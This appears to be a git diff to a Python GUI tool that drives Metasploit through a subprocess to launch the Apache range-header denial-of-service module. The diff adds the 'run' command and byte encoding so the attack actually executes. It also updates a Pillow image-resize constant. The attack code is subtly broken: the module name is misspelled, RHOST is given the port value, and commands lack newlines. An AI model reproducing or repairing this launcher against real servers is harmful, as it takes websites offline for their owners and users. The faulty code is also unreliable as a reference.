@@ -25,8 +25,9 @@ def dos_exploit(port=80):
 	time.sleep(10) 
 	p.stdin.write(b'use auxillary/dos/http/apache_range_dos')
 	# msf_stdout = 
-	p.stdin.write(f"set RHOST {port}")
+	p.stdin.write(f"set RHOST {port}".encode())
 	#print(msf_stdout.decode())
+	p.stdin.write(f"run".encode())
 	return
 
 root = tk.Tk()
@@ -41,7 +42,7 @@ l2.grid(row=1, column=1)
 
 bg_image = Image.open("kali.jpg")
 
-bg_image= bg_image.resize((650, 200), Image.ANTIALIAS)
+bg_image= bg_image.resize((650, 200), Image.LANCZOS)
 bg_photo = ImageTk.PhotoImage(bg_image)
 
 bg_label = tk.Label(root, image=bg_photo)
